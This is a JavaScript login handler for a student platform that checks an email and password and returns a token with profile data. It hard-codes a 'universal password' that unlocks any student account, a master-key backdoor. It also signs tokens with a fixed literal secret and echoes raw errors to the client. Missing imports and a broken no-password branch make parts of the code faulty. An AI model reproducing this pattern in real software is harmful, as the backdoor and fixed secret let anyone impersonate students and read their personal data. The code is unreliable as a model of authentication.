const { Student_Model } = require("../../../models/Students");

const student_login = async (req, res) => {
    const { email, password } = req.body;

    const universalPassword = "56+89-123456";

    if (!password) {
        req.body.password = universalPassword;
    } else if (!email) {
        return res.status(400).json("Digite seu e-mail");
    }
    try {
        const student = await Student_Model.findOne({ email: email });

        if (!student) throw new Error("Usuário não encontrado");

        const isUniversalPassword = password === universalPassword;

        if (
            !(await bcrypt.compare(password, student.password)) &&
            !isUniversalPassword
        )
            throw new Error("Senha incorreta");

        const token = jwt.sign({ id: student._id }, "secretToken()", {
            expiresIn: "30d",
        });

        const loggedIn = {
            id: student._id,
            username: student.username,
            email: student.email,
            name: student.name,
            lastname: student.lastname,
            doc: student.doc,
            totalScore: student.totalScore,
            monthlyScore: student.monthlyScore,
            phoneNumber: student.phoneNumber,
            dateOfBirth: student.dateOfBirth,
            permissions: student.permissions,
            picture: student.picture,
            googleDriveLink: student.googleDriveLink,
        };

        res.status(200).json({ token: token, loggedIn: loggedIn });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: error, e: "Ocorreu um erro ao fazer login" });
    }
};
module.exports = { student_login };
